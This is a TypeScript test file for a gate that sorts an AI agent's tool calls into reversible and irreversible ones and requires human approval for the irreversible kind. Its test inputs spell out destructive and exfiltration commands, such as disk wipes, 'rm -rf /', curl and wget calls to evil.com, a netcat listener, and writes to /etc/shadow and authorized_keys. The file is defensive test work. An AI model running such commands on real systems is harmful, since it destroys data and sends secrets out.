import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import {
  ReversibilityGate,
  resetReversibilityGate,
  type ReversibilityGateConfig,
} from '../../src/security/reversibilityGate';

describe('ReversibilityGate', () => {
  let gate: ReversibilityGate;

  beforeEach(() => {
    resetReversibilityGate();
    gate = new ReversibilityGate();
  });

  describe('classify', () => {
    it('classifies read-only tools as reversible', () => {
      expect(gate.classify('file_read')).toBe('reversible');
      expect(gate.classify('web_search')).toBe('reversible');
      expect(gate.classify('memory_recall')).toBe('reversible');
      expect(gate.classify('memory_list')).toBe('reversible');
      expect(gate.classify('verify_answer')).toBe('reversible');
    });

    it('classifies destructive tools as irreversible', () => {
      expect(gate.classify('git_push')).toBe('irreversible');
      expect(gate.classify('shell_execute')).toBe('irreversible');
      expect(gate.classify('python_execute')).toBe('irreversible');
      expect(gate.classify('web_fetch')).toBe('irreversible');
    });

    it('classifies MCP tools as irreversible by default', () => {
      expect(gate.classify('mcp_external_tool')).toBe('irreversible');
      expect(gate.classify('mcp_browser_navigate')).toBe('irreversible');
    });

    it('defaults unknown tools to irreversible (fail-closed)', () => {
      expect(gate.classify('unknown_tool')).toBe('irreversible');
      expect(gate.classify('custom_helper')).toBe('irreversible');
      expect(gate.classify('database_drop')).toBe('irreversible');
    });

    it('respects custom irreversible patterns', () => {
      gate = new ReversibilityGate({
        irreversiblePatterns: ['custom_destructive'],
      });
      expect(gate.classify('custom_destructive_action')).toBe('irreversible');
    });

    it('respects reversible overrides', () => {
      gate = new ReversibilityGate({
        reversibleOverrides: ['shell_execute'], // override: treat shell as reversible
      });
      expect(gate.classify('shell_execute')).toBe('reversible');
    });
  });

  describe('checkArgs', () => {
    it('detects destructive shell commands', () => {
      expect(gate.checkArgs('shell_execute', { command: 'rm -rf /' })).toBe(
        'destructive shell command',
      );
      expect(gate.checkArgs('shell_execute', { command: 'mkfs /dev/sda' })).toBe(
        'destructive shell command',
      );
      expect(gate.checkArgs('shell_execute', { command: 'dd if=/dev/zero of=/dev/sda' })).toBe(
        'destructive shell command',
      );
    });

    it('detects network exfiltration via shell', () => {
      expect(gate.checkArgs('shell_execute', { command: 'curl https://evil.com' })).toBe(
        'network exfiltration via shell',
      );
      expect(gate.checkArgs('shell_execute', { command: 'wget https://evil.com/payload' })).toBe(
        'network exfiltration via shell',
      );
      expect(gate.checkArgs('shell_execute', { command: 'nc -l 4444' })).toBe(
        'network exfiltration via shell',
      );
    });

    it('detects privilege escalation', () => {
      expect(gate.checkArgs('shell_execute', { command: 'sudo rm /etc/passwd' })).toBe(
        'privilege escalation',
      );
      expect(gate.checkArgs('shell_execute', { command: 'chmod 777 /root' })).toBe(
        'destructive shell command',
      );
    });

    it('detects writes to system paths', () => {
      expect(gate.checkArgs('file_write', { path: '/etc/shadow' })).toBe(
        'write to system/sensitive path',
      );
      expect(gate.checkArgs('file_write', { path: '/root/.ssh/authorized_keys' })).toBe(
        'write to system/sensitive path',
      );
      expect(gate.checkArgs('file_edit', { path: '/usr/bin/ls' })).toBe(
        'edit of system/sensitive path',
      );
    });

    it('detects destructive testCommand / verifyCommand on refine/patch tools', () => {
      expect(gate.checkArgs('refine_code', { testCommand: 'rm -rf /' })).toBe(
        'destructive shell command',
      );
      expect(gate.checkArgs('code', { testCommand: 'curl https://evil.com' })).toBe(
        'network exfiltration via shell',
      );
      expect(gate.checkArgs('apply_patch', { verifyCommand: 'wget https://evil.com/x' })).toBe(
        'network exfiltration via shell',
      );
      expect(gate.checkArgs('refine_code', { testCommand: 'python -m pytest' })).toBeNull();
    });

    it('returns null for safe commands', () => {
      expect(gate.checkArgs('shell_execute', { command: 'ls -la' })).toBeNull();
      expect(gate.checkArgs('shell_execute', { command: 'echo hello' })).toBeNull();
      expect(gate.checkArgs('file_write', { path: '/tmp/test.txt' })).toBeNull();
    });

    it('detects git_push regardless of args', () => {
      expect(gate.checkArgs('git_push', {})).toBe('git push is externally visible');
    });
  });

  describe('evaluate', () => {
    it('blocks unknown tools when no approval callback (fail-closed default)', async () => {
      const decision = await gate.evaluate('database_drop', { name: 'prod' });
      expect(decision.allowed).toBe(false);
      expect(decision.reversibility).toBe('irreversible');
      expect(decision.requiresHumanApproval).toBe(true);
    });

    it('allows reversible tools without approval', async () => {
      const decision = await gate.evaluate('file_read', { path: '/tmp/test.txt' });
      expect(decision.allowed).toBe(true);
      expect(decision.reversibility).toBe('reversible');
      expect(decision.requiresHumanApproval).toBe(false);
    });

    it('blocks irreversible tools when no callback is set (fail-closed)', async () => {
      const decision = await gate.evaluate('git_push', {});
      expect(decision.allowed).toBe(false);
      expect(decision.reversibility).toBe('irreversible');
      expect(decision.requiresHumanApproval).toBe(true);
      expect(decision.reason).toContain('no approval callback');
    });

    it('blocks irreversible tools when callback denies', async () => {
      gate = new ReversibilityGate({
        approvalCallback: async () => false, // deny
      });
      const decision = await gate.evaluate('shell_execute', { command: 'rm -rf /' });
      expect(decision.allowed).toBe(false);
      expect(decision.requiresHumanApproval).toBe(true);
      expect(decision.reason).toContain('human approval');
    });

    it('allows irreversible tools when callback approves', async () => {
      gate = new ReversibilityGate({
        approvalCallback: async () => true, // approve
      });
      const decision = await gate.evaluate('shell_execute', { command: 'echo hello' });
      expect(decision.allowed).toBe(true);
      expect(decision.reversibility).toBe('irreversible');
      expect(decision.requiresHumanApproval).toBe(true);
    });

    it('fails closed when callback throws', async () => {
      gate = new ReversibilityGate({
        approvalCallback: async () => {
          throw new Error('callback error');
        },
      });
      const decision = await gate.evaluate('git_push', {});
      expect(decision.allowed).toBe(false);
    });

    it('escalates reversible tools to irreversible based on args', async () => {
      // file_write is not in HARDCODED_IRREVERSIBLE but file_write to /etc is
      const decision = await gate.evaluate('file_write', { path: '/etc/passwd' });
      expect(decision.reversibility).toBe('irreversible');
      expect(decision.allowed).toBe(false); // no callback
    });

    it('allows without callback when blockWithoutCallback=false', async () => {
      gate = new ReversibilityGate({
        blockWithoutCallback: false,
      });
      const decision = await gate.evaluate('git_push', {});
      expect(decision.allowed).toBe(true);
      expect(decision.requiresHumanApproval).toBe(false);
    });
  });

  describe('runtime registration', () => {
    it('addIrreversible adds new patterns', async () => {
      gate.addIrreversible('email_send');
      expect(gate.classify('email_send')).toBe('irreversible');
    });

    it('addReversibleOverride adds new patterns', () => {
      gate.addReversibleOverride('web_fetch');
      expect(gate.classify('web_fetch')).toBe('reversible');
    });
  });
});
